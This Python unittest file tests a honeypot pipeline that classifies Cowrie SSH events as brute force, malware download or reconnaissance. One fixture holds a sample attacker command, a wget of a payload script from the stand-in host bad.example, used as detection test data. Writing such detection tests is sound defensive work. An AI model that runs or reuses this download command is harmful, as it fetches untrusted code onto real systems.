from __future__ import annotations

import unittest

from honeypot_pipeline.classification import classify_event
from honeypot_pipeline.cowrie import normalize_cowrie_event
from honeypot_pipeline.records import build_event_record


class ClassificationTests(unittest.TestCase):
    def test_classifies_login_activity_as_brute_force(self) -> None:
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.login.failed",
                "protocol": "ssh",
                "src_ip": "203.0.113.10",
            }
        )

        classification = classify_event(event)

        self.assertEqual(classification["target_profile"], "server")
        self.assertEqual(classification["service_type"], "ssh")
        self.assertEqual(classification["attack_category"], "brute_force")
        self.assertEqual(classification["severity"], "medium")

    def test_classifies_download_commands_as_malware_download(self) -> None:
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.command.input",
                "protocol": "ssh",
                "input": "wget http://bad.example/payload.sh",
                "url": "http://bad.example/payload.sh",
            }
        )

        classification = classify_event(event)

        self.assertEqual(classification["attack_category"], "malware_download")
        self.assertEqual(classification["severity"], "high")

    def test_build_record_includes_indicators_and_classification(self) -> None:
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.command.input",
                "protocol": "ssh",
                "src_ip": "198.51.100.24",
                "input": "whoami",
            }
        )

        record = build_event_record(event)

        self.assertEqual(record["indicators"]["ip_addresses"], ["198.51.100.24"])
        self.assertEqual(record["classification"]["attack_category"], "reconnaissance")
        self.assertEqual(record["risk"]["level"], "low")


if __name__ == "__main__":
    unittest.main()
